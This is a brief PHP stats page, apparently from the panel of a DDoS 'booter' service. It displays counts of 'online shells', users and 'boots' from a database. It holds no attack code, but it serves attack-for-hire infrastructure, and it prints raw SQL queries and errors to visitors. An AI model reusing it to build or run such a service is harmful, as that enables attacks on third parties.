<?php
include 'inc/db.php';
include 'inc/header.php';
?>

<html>
    <body>
        <br>
        <p class="success";>Stats!</p>
        <p class="stats1">Online shells: </p><p class="stats2"><?php
        $query = "SELECT COUNT(*) AS total FROM `shells`";
        $result = $mysqli->query($query) or die($query.'<br />'.$mysqli->error);
        $row = mysqli_fetch_assoc($result);
        echo $row['total'];
        ?></p>
        <p class="stats1">Total users: </p><p class="stats2"><?php
        $query = "SELECT COUNT(*) AS total FROM `users`";
        $result = $mysqli->query($query) or die($query.'<br />'.$mysqli->error);
        $row = mysqli_fetch_assoc($result);
        echo $row['total'];
        ?></p>
        <p class="stats1">Total boots: </p><p class="stats2"><?php
        $query = "SELECT COUNT(*) AS total FROM `logs`";
        $result = $mysqli->query($query) or die($query.'<br />'.$mysqli->error);
        $row = mysqli_fetch_assoc($result);
        echo $row['total'];
        ?></p>
        <p class="stats1">Total hits: </p><p class="stats2"><?php
        $query = "SELECT counter FROM counter";
        $result = $mysqli->query($query) or die($query.'<br />'.$mysqli->error);
        $row = mysqli_fetch_assoc($result);
        echo $row['counter'];
        ?></p>
    </body>
</html>
